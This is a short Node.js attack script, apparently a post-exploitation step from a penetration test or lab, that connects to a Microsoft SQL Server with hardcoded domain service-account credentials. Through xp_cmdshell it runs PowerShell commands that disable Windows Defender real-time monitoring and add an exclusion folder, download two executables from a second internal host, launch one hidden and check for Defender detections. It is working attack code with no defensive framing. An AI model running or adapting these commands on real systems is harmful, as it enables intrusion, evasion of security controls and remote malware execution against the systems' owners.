const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" },
    },
    options: { encrypt: false, trustServerCertificate: true },
    port: 1433,
    requestTimeout: 45000,
  });
  const q = async (s) => {
    try {
      console.log("=>", JSON.stringify((await sql.query(s)).recordset));
    } catch (e) {
      console.log("ERR", e.message);
    }
  };
  // Try disable Defender RT / add exclusion (may fail)
  await q(
    "EXEC xp_cmdshell 'powershell -c \"try { Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\\Users\\Public; \\\"DEF_OK\\\" } catch { $_.Exception.Message }\"'"
  );
  await q(
    "EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://172.16.0.12:8080/p_enum.exe -OutFile C:/Users/Public/p_enum.exe -UseBasicParsing; Invoke-WebRequest -Uri http://172.16.0.12:8080/s.exe -OutFile C:/Users/Public/s.exe -UseBasicParsing\"'"
  );
  await q("EXEC xp_cmdshell 'dir C:\\Users\\Public\\p_enum.exe C:\\Users\\Public\\s.exe'");
  await q(
    "EXEC xp_cmdshell 'powershell -c \"Start-Process C:\\Users\\Public\\p_enum.exe -WindowStyle Hidden; Start-Sleep 8; Get-Process p_enum,s -ErrorAction SilentlyContinue | ft Id,ProcessName | Out-String; Get-MpThreatDetection | Sort InitialDetectionTime -Desc | Select -First 2 | fl ProcessName,Resources,InitialDetectionTime | Out-String\"'"
  );
  process.exit(0);
})().catch((e) => {
  console.log(e);
  process.exit(1);
});
